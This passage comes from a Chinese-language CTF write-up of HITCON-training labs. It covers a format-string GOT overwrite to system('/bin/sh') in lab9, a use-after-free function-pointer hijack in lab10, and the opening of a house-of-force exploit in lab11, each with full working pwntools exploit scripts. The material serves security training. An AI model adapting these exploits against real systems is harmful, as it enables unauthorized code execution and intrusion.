    p.recvuntil('Give me magic :')
    p.sendline(payload4)
    p.interactive()
# lab9
这道题就比较有难度了，找了很久只发现[Veritas501](https://veritas501.space/2017/05/23/HITCON-training%20writeup/)大佬才写了这道题的wp，认真膜拜了一波，才理解这道题是怎么样做出来的  
从IDA和checksec来看，就是开了NX保护，然后有个格式化字符串的漏洞，关键点在于，这次的buf不在栈上，而是在bss段里，这就导致我们构造的格式化字符串都在bss段了，这就很尴尬了，不能向之前一样用%s%p%n去读取和写入栈的数据了  
于是我们只能间接得去写和读数据，通过ebp保存的数据从而实现数据的读写  
我们可以看到在输入“asds”后的栈中的情况：  
这里有用的就是这四条，分别是ebp1、fmt7、ebp2、fmt11，而他们相对于格式化字符串的偏移分别是6、7、10、11
    0048| 0xffffceb8 --> 0xffffcec8 --> 0xffffced8 --> 0x0 
    0052| 0xffffcebc --> 0x8048584 (:  nop)
    、、、、、、、、、、、、、
    0064| 0xffffcec8 --> 0xffffced8 --> 0x0 
    0068| 0xffffcecc --> 0x80485b1 (:  nop)
从上我们可以看到，ebp1的内容是指向ebp2的地址的指针，而ebp2的内容又是指向其他地址的指针，因此如果我们用%n对ebp1进行操作，那么实际上会修改ebp2的值，如果此时再把ebp2的内容改成一个指向fmt7的指针，然后在对ebp2进行%n操作，那么就可以改变fmt7的内容，从而实现了间接修改某个地址的内容，试想一下，我们把fmt7的内容又改成printf的got表地址，那么fmt7就指向了printf_got的地址，如果用%s操作，就可以把printf_got的内容打印出来，从而得到了printf函数的真正地址，到了这里，我们就可以通过printf函数泄漏出system的真正地址了，于是这道题的解体思路就出来了：
    1.通过ebp_1使ebp_2指向fmt_7
    2.通过ebp_2将fmt_7处的内容覆盖成printf_got
    3.通过ebp_1使ebp_2指向fmt_11
    4.通过ebp_2将fmt_11处的内容修改成printf_got+2
    5.通过fmt_7将printf_got地址泄露出来
    6.计算出system函数的地址 ,将system函数地址写入printf在got表的地址
    具体做法是将 system函数地址的前两个字节写入fmt_7,后两个字节写入 fmt_11
    7.执行printf函数相当于执行system函数
    8.输入"/bin/sh"字符串，让system函数从栈中取参数getshell
思路如图所示：
完整的exp：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    p = process('./playfmt')
    elf = ELF('./playfmt')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    printf_got = elf.got['printf']
    system_libc = libc.symbols['system']  
    printf_libc = libc.symbols['printf']  
    p.recv()
    log.info("**********leak printf_got************") 
    payload = '%6$x'
    p.sendline(payload)
    ebp2 = int(p.recv(),16)
    ebp1 = ebp2 - 0x10
    fmt_7 = ebp2 -0x0c
    fmt_11 = ebp2 + 0x04
    log.info("printf_got-->p[%s]"%hex(printf_got))
    log.info("ebp_1-->p[%s]"%hex(ebp1))
    log.info("ebp_2-->p[%s]"%hex(ebp2))
    log.info("fmt_7-->p[%s]"%hex(fmt_7))
    log.info("fmt_11-->p[%s]"%hex(fmt_11))
    payload = '%' + str(fmt_7 & 0xffff) + 'c%6$hn'
    #ebp2 = fmt_7
    p.sendline(payload)
    p.recv()
    payload = '%' + str(printf_got & 0xffff) + 'c%10$hn'
    #fmt_7 = prinf_got
    p.sendline(payload)
    p.recv()
    while True:
        p.send("23r3f")
        sleep(0.1)
        data = p.recv()
        if data.find("23r3f") != -1:
            break
    '''
    这个循环用于保证所有的字节都被输出，因为recv（）一次最多只能接收0x1000
    个字节，所以要进行多次recv（）才能保证全部字节都输出以便进行下面的操作
    需要注意的是，要构造一个字符串“23r3f”来作标志，返回的大量字符串中如果
    包含了这个字符串那么说明之前构造的%n写入已经完成
    ''' 
    payload = '%' + str(fmt_11 & 0xffff) + 'c%6$hn'
    #ebp2 = fmt_11
    p.sendline(payload)
    p.recv()
    payload = '%' + str((printf_got+2) & 0xffff) + 'c%10$hn'
    #fmt_11 = prinf_got + 2
    p.sendline(payload)
    p.recv()    
    while True:
        p.send("23r3f")
        sleep(0.1)
        data = p.recv()
        if data.find("23r3f") != -1:
            break
    log.info("******leaking the print_got_add*********")
    payload = 'aaaa%7$s'
    p.sendline(payload)
    p.recvuntil("aaaa")
    printf_addr = u32(p.recv(4))
    log.info("print_got_add is:[%s]"%hex(printf_addr))
    system_addr = printf_addr - printf_libc + system_libc
    log.info("system_add is:[%s]"%hex(system_addr))
    #pause()
    payload = '%' +str(system_addr &0xffff) +'c%7$hn'
    payload += '%' +str((system_addr>>16) - (system_addr &0xffff)) +'c%11$hn'
    '''
    这里需要注意的是，我们把system的地址的前后两个字节分别写到fmt-7和fmt-11中，
    在写入后两个字节的时候要注意减去前面输入的(system_addr &0xffff))，这是因为
    %n写入操作是算累积输入的字符个数
    '''
    p.sendline(payload)
    p.recv()
    while True:
        p.send("23r3f")
        sleep(0.1)
        data = p.recv()
        if data.find("23r3f") != -1:
            break
    p.sendline("/bin/sh")
    '''
    这个时候输入参数到栈中，本来下一步程序会调用printf函数，但是此时printf函数的got表
    已经被修改为system的地址了，此时就会执行system并且从栈中取bin/sh参数
    于是就这样getshell
    '''
    p.interactive()
* * *
# lab10
hacknote
从这里开始就堆的题目了  
可以看到没开多少保护，是一道简单的UAF的漏洞  
在创建note的时候，malloc了两次，第一次malloc一个8字节大小的块去存一个函数指针，用来打印出chunk的内容，第二次malloc一个size大小的块去存note的内容
也就是一次新建note两次malloc，一次大小是8一次是输入的size
这个时候就很容易想到利用的方法了，也就是UAF----use after free  
由于malloc和free的机制问题，先被free掉的块会很快用于新的malloc（如果大小合适的话）  
从图可以看到这个程序中的delet功能和show功能是怎么样实现的
这里还有一个直接cat flag的函数，因此我们只要想办法调用这个函数就可以搞定了  
解题的思路是：
  1. 申请chunk1，大小为32（保证是fast bin范围就行），内容随意
  2. 申请chunk2，大小为32（保证是fast bin范围就行），内容随意
  3. 申请chunk3，大小为32（保证是fast bin范围就行），内容随意
  4. free掉chunk1
  5. free掉chunk2
此时的fast_bin的分布是这样的：  
chunk2(8大小)-->\-->chunk1(8大小)  
chunk2(32大小)-->chunk1(32大小)
  1. 申请chunk4，大小为8，内容为magic的函数地址  
申请chunk4的时候首先会申请一个8大小的空间，这时chunk2(8大小)的空间给了这个块，接着再申请size
大小的块，这时chunk1(8大小)的空间给了这个块  
同时向chunk4中写入magic的函数地址，也就相对应向chunk1(8大小)写入magic的函数地址，此时原本存放puts函数指针的地方被magic函数覆盖了，也就导致了接下来打印chunk1内容的时候会直接执行magic
  2. 打印chunk1的内容，执行magic函数
exp如下：
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="i386",log_level = "debug")
    ip =""
    if ip:
        p = remote(ip,20004)
    else:
        p = process("./hacknote", aslr=0)
    elf = ELF("./hacknote")
    #libc = ELF("./libc-2.23.so")
    #libc = elf.libc
    def sl(s):
        p.sendline(s)
    def sd(s):
        p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def getshell():
        p.interactive()
    catflag = 0x08048986
    #add 0
    ru("Your choice :")
    sl("1")
    ru("Note size :")
    sl("32")
    ru("Content :")
    sd("aaaaaaaa")
    #add 1
    ru("Your choice :")
    sl("1")
    ru("Note size :")
    sl("32")
    ru("Content :")
    sd("bbbbbbbb")
    #add 2
    ru("Your choice :")
    sl("1")
    ru("Note size :")
    sl("32")
    ru("Content :")
    sd("cccccccc")
    #free  0
    ru("Your choice :")
    sl("2")
    ru("Index :")
    sl("0")
    #free  1
    ru("Your choice :")
    sl("2")
    ru("Index :")
    sl("1")
    # gdb.attach(p)
    # pause()
    #add 3
    ru("Your choice :")
    sl("1")
    ru("Note size :")
    sl("8")
    ru("Content :")
    sd(p32(catflag))
    #show
    ru("Your choice :")
    sl("3")
    ru("Index :")
    sl("0")
    # ru("Your choice :")
    # sl("4")
    getshell()
# lab11
先来看一下这题的基本信息和漏洞点
以上就是这道题目的漏洞点，大概有三种方法可以用来解题：
## 方法一：利用house of force，修改top chunk大小再分配chunk，实现任意地址写，调用magic函数
具体的原理可以看ctf-wiki中的介绍，不算难理解
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="amd64",log_level = "debug")
    ip =""
    if ip:
        p = remote(ip,20004)
    else:
        p = process("./bamboobox", aslr=0)